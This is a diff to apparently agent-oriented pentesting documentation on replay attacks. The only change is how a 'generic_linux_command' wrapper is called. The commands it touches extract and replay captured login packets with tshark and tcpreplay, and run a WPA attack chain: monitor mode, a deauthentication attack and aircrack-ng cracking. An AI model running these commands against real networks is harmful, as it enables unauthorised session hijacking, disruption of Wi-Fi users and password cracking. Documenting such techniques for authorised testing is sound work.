@@ -82,13 +82,13 @@ apt-get install tcpreplay
 
 ```python
 # Analyze a PCAP file to identify authentication packets
-generic_linux_command("tshark", "-r capture.pcap -Y 'http.request.method==POST && http.host contains \"login\"' -T fields -e frame.number -e ip.src -e tcp.srcport -e ip.dst -e tcp.dstport -e http.request.uri -e http.file_data")
+generic_linux_command("tshark -r capture.pcap -Y 'http.request.method==POST && http.host contains \"login\"' -T fields -e frame.number -e ip.src -e tcp.srcport -e ip.dst -e tcp.dstport -e http.request.uri -e http.file_data")
 
 # Extract specific packets for replay
-generic_linux_command("tshark", "-r capture.pcap -w auth_packets.pcap -Y 'frame.number==1234'")
+generic_linux_command("tshark -r capture.pcap -w auth_packets.pcap -Y 'frame.number==1234'")
 
 # Replay extracted packets
-generic_linux_command("tcpreplay", "-i eth0 -t -K auth_packets.pcap")
+generic_linux_command("tcpreplay -i eth0 -t -K auth_packets.pcap")
 ```
 
 ### 2. Session Token Extraction and Replay with pwntools
@@ -232,10 +232,10 @@ api_request_replay()
 ### 6. WPA Handshake Capture and Replay
 
 ```python
-generic_linux_command("airmon-ng", "start wlan0")
-generic_linux_command("airodump-ng", "wlan0mon -c 1 --bssid AA:BB:CC:DD:EE:FF -w capture")
-generic_linux_command("aireplay-ng", "--deauth 5 -a AA:BB:CC:DD:EE:FF wlan0mon")
-generic_linux_command("aircrack-ng", "capture-01.cap -w wordlist.txt")
+generic_linux_command("airmon-ng start wlan0")
+generic_linux_command("airodump-ng wlan0mon -c 1 --bssid AA:BB:CC:DD:EE:FF -w capture")
+generic_linux_command("aireplay-ng --deauth 5 -a AA:BB:CC:DD:EE:FF wlan0mon")
+generic_linux_command("aircrack-ng capture-01.cap -w wordlist.txt")
 ```
 
 ## Key Techniques for Various Protocols
